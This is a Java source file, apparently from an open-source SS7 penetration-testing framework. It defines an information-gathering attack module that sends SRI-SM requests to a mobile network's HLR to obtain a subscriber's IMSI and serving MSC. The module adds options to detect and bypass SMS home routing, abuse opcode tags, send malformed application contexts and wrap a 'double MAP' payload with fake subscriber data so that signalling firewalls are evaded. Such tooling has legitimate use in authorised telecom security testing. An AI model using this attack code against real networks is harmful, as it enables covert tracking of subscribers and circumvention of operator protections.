/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.intruder.ss7.usecases.attacks.infogathering;

import com.rodan.intruder.ss7.entities.event.model.sms.SriSmResponse;
import com.rodan.intruder.ss7.entities.event.service.MapSmsServiceListener;
import com.rodan.intruder.ss7.entities.payload.mobility.UlPayload;
import com.rodan.intruder.ss7.entities.payload.sms.ReportSmDeliveryStatusPayload;
import com.rodan.intruder.ss7.entities.payload.sms.SriSmPayload;
import com.rodan.intruder.ss7.usecases.Ss7ModuleTemplate;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleConstants;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleOptions;
import com.rodan.intruder.ss7.usecases.model.infogathering.SmsRoutingInfoOptions;
import com.rodan.intruder.ss7.usecases.model.infogathering.SmsRoutingInfoResponse;
import com.rodan.intruder.ss7.usecases.port.Ss7Gateway;
import com.rodan.library.model.Constants;
import com.rodan.library.model.annotation.Module;
import com.rodan.library.model.error.ApplicationException;
import com.rodan.library.model.error.ErrorCode;
import com.rodan.library.model.error.SystemException;
import com.rodan.library.model.error.ValidationException;
import com.rodan.library.model.notification.NotificationType;
import com.rodan.intruder.kernel.usecases.SignalingModule;
import com.rodan.library.util.Util;
import lombok.Builder;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

@Module(name = Ss7ModuleConstants.SMS_ROUTING_INFO_NAME, category = Ss7ModuleConstants.INFO_GATHERING_CATEGORY_DISPLAY_NAME,
        displayName = Ss7ModuleConstants.SMS_ROUTING_INFO_DISPLAY_NAME, brief = Ss7ModuleConstants.SMS_ROUTING_INFO_BRIEF,
        description = Ss7ModuleConstants.SMS_ROUTING_INFO_DESCRIPTION, rank = Ss7ModuleConstants.SMS_ROUTING_INFO_RANK,
        mainPayload = Constants.SRI_SM_PAYLOAD_NAME,
        compatiblePayloads = {Constants.REPORT_SM_DELIVERY_STATUS_PAYLOAD_NAME})
public class SmsRoutingInfoModule extends Ss7ModuleTemplate implements SignalingModule, MapSmsServiceListener {
    final static Logger logger = LogManager.getLogger(SmsRoutingInfoModule.class);

    private SmsRoutingInfoResponse firstResponse;

    @Builder
    public SmsRoutingInfoModule(Ss7Gateway gateway, Ss7ModuleOptions moduleOptions) {
        super(gateway, moduleOptions);
        setTaskWaitTime(1500);
    }

    @Override
    protected void generatePayload() {
        logger.debug("Generating payload");
        logger.debug("Module Options: " + moduleOptions);
        var options = (SmsRoutingInfoOptions) moduleOptions;
        var payload = SriSmPayload.builder()
                .localGt(options.getNodeConfig().getSs7Association().getLocalNode().getGlobalTitle())
                .msisdn(options.getMsisdn()).imsi(options.getImsi())
                .targetHlrGt(options.getTargetHlrGt()).smscGt(options.getSmscGt())
                .detectSmsHomeRouting(options.getDetectSmsHomeRouting()).bypassSmsHomeRouting(options.getBypassSmsHomeRouting())
                .abuseOpcodeTag(options.getAbuseOpcodeTag()).malformedAcn(options.getMalformedAcn())
                .cc(options.getCc()).ndc(options.getNdc()).mcc(options.getMcc()).mnc(options.getMnc())
                .mapVersion(options.getMapVersion())
                .build();
        setMainPayload(payload);
        setCurrentPayload(getMainPayload());

        // Double MAP component bypass
        if ("Yes".equalsIgnoreCase(options.getDoubleMap())) {
            var fakeSubscriberInfo = options.getNodeConfig().getFakeSubscriberInfo();
            var bypass = ReportSmDeliveryStatusPayload.builder()
                    .localGt(options.getNodeConfig().getSs7Association().getLocalNode().getGlobalTitle())
                    .msisdn(fakeSubscriberInfo.getMsisdn()).smscGt(options.getSmscGt()).mapVersion(options.getMapVersion())
                    .build();
            setBypassPayload(bypass);
        }
        logger.debug("Payload: " + payload);
    }

    @Override
    protected void addServiceListener() throws SystemException {
        logger.debug("Adding service listeners");
        super.addServiceListener();
        var localSsn = getMainPayload().getLocalSsn();
        getGateway().addSmsServiceListener(localSsn, this);
    }

    @Override
    protected void cleanup() throws SystemException {
        super.cleanup();
        if (getGateway() != null && getMainPayload() != null) {
            var localSsn = getMainPayload().getLocalSsn();
            getGateway().removeSmsServiceListener(localSsn, this);
        }
    }

    @Override
    protected void postExecuteAction() throws SystemException {
        // For SMS Home Routing, SRI-SM response will match one of the below
        // Correlation ID instead of IMSI (random value depends on HR implementation)
        // It's own GT as the remote node number instead of vMSC
        // And the CgPA will be its GT instead of HLR (depends on HR implementation)
        // Or MSISDN/IMSI as it's CgPA
        var currentResponse = (SmsRoutingInfoResponse) moduleResponse;
        var previousResponse = (SmsRoutingInfoResponse) firstResponse;
        var homeRoutingResult = "No";

        // CgPA == remoteNode
        logger.debug("Checking Remote Node Number against CgPA to detect SMS home routing");
        if (currentResponse.getHlrGt().equals(currentResponse.getVmsc())) {
            notify("CgPA match VMSC", NotificationType.PROGRESS);
            homeRoutingResult = updateHomeRoutingResult(homeRoutingResult, "CgPA match VMSC");
        }

        // CgPA == MSISDN or E.214 IMSI
        logger.debug("Checking CgPA against MSISDN/IMSI to detect SMS home routing");
        var sender = getSenderAddress();
        if (sender.equals(currentResponse.getHlrGt())) {
            notify("CgPA match MSISDN/IMSI", NotificationType.PROGRESS);
            homeRoutingResult = updateHomeRoutingResult(homeRoutingResult, "CgPA match MSISDN/IMSI");
        }

        var detectHomeRouting = "yes".equals(((SriSmPayload) getMainPayload()).getDetectSmsHomeRouting());
        if (detectHomeRouting && previousResponse != null) {
            logger.debug("Comparing SRI-SM responses to detect SMS home routing");
            if (!previousResponse.getImsi().equals(currentResponse.getImsi())) {
                notify("IMSI mismatch", NotificationType.PROGRESS);
                homeRoutingResult = updateHomeRoutingResult(homeRoutingResult, "IMSI mismatch");
            }
            if (!previousResponse.getVmsc().equals(currentResponse.getVmsc())) {
                notify("VMSC mismatch", NotificationType.PROGRESS);
                homeRoutingResult = updateHomeRoutingResult(homeRoutingResult, "VMSC mismatch");
            }

            if ("No".equalsIgnoreCase(homeRoutingResult)) {
                notify("No SMS home routing detected", NotificationType.PROGRESS);
            } else {
                notify("*SMS home routing detected", NotificationType.WARNING);
            }
        }

        moduleResponse = SmsRoutingInfoResponse.builder()
                .imsi(currentResponse.getImsi()).hlrGt(currentResponse.getHlrGt()).vmsc(currentResponse.getVmsc())
                .smsHomeRouting(homeRoutingResult)
                .build();
    }

    @Override
    public void onSendRoutingInfoForSMResponse(SriSmResponse response) {
        try {
            logger.debug("##### Received SRI-SM response!");
            logger.debug(response);
            logger.debug("Parsing response.");

            var detectHomeRouting = "yes".equals(((SriSmPayload) getMainPayload()).getDetectSmsHomeRouting());
            if (detectHomeRouting && firstResponse == null) {
                notify("Sending a 2nd SRi-SM message to detect SMS home routing.", NotificationType.PROGRESS);
                // SMS router (SMS-R) will reply with a fake IMSI (correlation ID) and it's own GT instead of
                // VMSC for SRI-SM messages. In addition GT of HLR cannot be disclosed from the response,
                // since response it sent from SMS-R not HLR.
                // To detect home routing, send 2 requests with same MSISDN and compare results
                firstResponse = SmsRoutingInfoResponse.builder()
                        .imsi(response.getImsi()).hlrGt(response.getHlrGt()).vmsc(response.getVmsc())
                        .build();
                logger.debug(firstResponse);

                execute();

            } else {
                moduleResponse = SmsRoutingInfoResponse.builder()
                        .imsi(response.getImsi()).hlrGt(response.getHlrGt()).vmsc(response.getVmsc())
                        .build();
                setResultReceived(true);
                logger.debug("SRI-SM completed!");
            }
        } catch (ApplicationException e) {
            String msg = "Failed to handle SRI-SM response.";
            logger.error(msg, e);
            notify(msg, NotificationType.FAILURE);
            setExecutionError(true);
        }
    }

    // IMSI is already validated in Dialog generation
    private String getSenderAddress() throws SystemException {
        try {
            var options = (SriSmPayload) getMainPayload();
            var bypassEnabled = "Yes".equalsIgnoreCase(options.getBypassSmsHomeRouting());
            var sender = "";
            if (bypassEnabled) {
                sender = Util.generateE214Address(options.getImsi(), options.getMcc(), options.getMnc(), options.getCc(),
                        options.getNdc());
            } else {
                sender = options.getMsisdn();
            }
            return sender;

        } catch (ValidationException e) {
            setExecutionError(true);
            throw SystemException.builder().code(ErrorCode.MODULE_REQUEST_ERROR).message(e.getMessage()).parent(e).build();
        }
    }

    private String updateHomeRoutingResult(String oldHr, String newHr) {
        var newResult = "";
        if ("No".equals(oldHr)) {
            newResult = "Yes! Reason: " + newHr;
        } else {
            newResult = oldHr + " | " + newHr;
        }

        return newResult;
    }
}
